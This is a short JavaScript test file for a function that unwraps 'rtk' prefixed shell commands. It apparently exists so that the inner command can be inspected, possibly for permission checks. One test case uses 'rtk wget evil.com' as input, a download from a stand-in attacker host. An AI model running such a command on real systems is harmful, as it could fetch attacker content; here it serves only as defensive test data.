import { parse } from 'unbash';
import { extractFromRtkCommand } from '../extractFromRtkCommand.js';

describe('extractFromRtkCommand', () => {
  describe('native subcommands — return null (caller uses full command)', () => {
    it.each([
      { commandLine: 'rtk --version' },
      { commandLine: 'rtk --help' },
      { commandLine: 'rtk rewrite "git status"' },
      { commandLine: 'rtk trust' },
      { commandLine: 'rtk config --create' },
      { commandLine: 'rtk' },
    ])('$commandLine', ({ commandLine }) => {
      const ast = parse(commandLine);
      const node = ast.commands[0].command;

      const actual = extractFromRtkCommand(commandLine, node);
      expect(actual).toBeNull();
    });
  });

  describe('transparent wrappers — return substring for caller to recurse on', () => {
    it.each([
      { commandLine: 'rtk git status', expected: 'git status' },
      { commandLine: 'rtk echo hello', expected: 'echo hello' },
      { commandLine: 'rtk wget evil.com', expected: 'wget evil.com' },
    ])('$commandLine', ({ commandLine, expected }) => {
      const ast = parse(commandLine);
      const node = ast.commands[0].command;

      const actual = extractFromRtkCommand(commandLine, node);
      expect(actual).toEqual(expected);
    });
  });
});
